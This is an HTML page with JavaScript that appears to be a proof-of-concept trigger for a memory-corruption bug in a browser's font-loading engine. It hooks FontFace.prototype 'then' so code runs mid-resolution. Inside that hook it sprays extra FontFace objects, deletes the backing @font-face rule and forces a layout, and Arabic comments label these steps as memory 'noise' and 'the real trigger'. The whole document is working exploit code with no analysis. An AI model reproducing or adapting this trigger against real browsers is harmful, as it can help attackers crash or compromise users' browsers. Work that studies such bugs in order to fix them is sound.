<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="debug" style="color:red; font-family:monospace;">Waiting...</div>
<script>
window.onload = () => {
    const debug = document.getElementById('debug');
    debug.innerText = "Script Loaded.";

    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    // void A.loaded هي التي تضمن أن المحرك بدأ في معالجة الكائن
    void A.loaded;

    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                debug.innerText = "HOOK TRIGGERED!";
                
                // هذه هي الضوضاء التي تملأ الذاكرة
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop; // الـ Trigger الحقيقي
            }
            return undefined;
        }
    });

    document.fonts.load('1em x', 'AB').then(() => {
        debug.innerText = "Load Completed (Stable)";
    }).catch((e) => {
        debug.innerText = "Load Failed (Caught Error)";
    });
};
</script>
</body>
</html>
